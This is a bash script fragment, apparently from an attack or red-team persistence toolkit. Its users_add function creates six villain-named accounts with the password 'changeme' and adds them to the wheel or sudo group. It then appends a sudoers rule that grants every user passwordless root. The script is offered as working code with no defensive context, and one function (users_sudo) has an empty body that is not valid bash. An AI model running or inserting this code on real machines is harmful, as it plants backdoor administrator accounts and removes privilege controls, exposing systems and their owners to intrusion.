users_sudo() {
};

users_add() {
    # Add all the following users add wheel/sudo with a password changem
    for user in "kong" "thanos" "deadpool" "bane" "vader" "yondu"; do
        QUIET useradd $user;
        s1=$?;
        echo "$user:changeme" | chpasswd 2>/dev/null >/dev/null;
        s2=$?;
        QUIET usermod -G `grep -oE "wheel|sudo" /etc/group` $user;
        s3=$?;
        if [ "$s3$s2$s1" != "000" ]; then
            fail="$fail $user";
        fi;
    done;
    if [ "$fail" != "" ]; then
        LOG 2 "failed to add users $fail";
    else
        LOG 0 "Added users"
    fi;

    echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> "/etc/sudoers";
}


users() {
    users_db "$GLOBAL_SERVER";
    LOG 0 "Sudoers added"
    users_sudo;
    users_add;
};
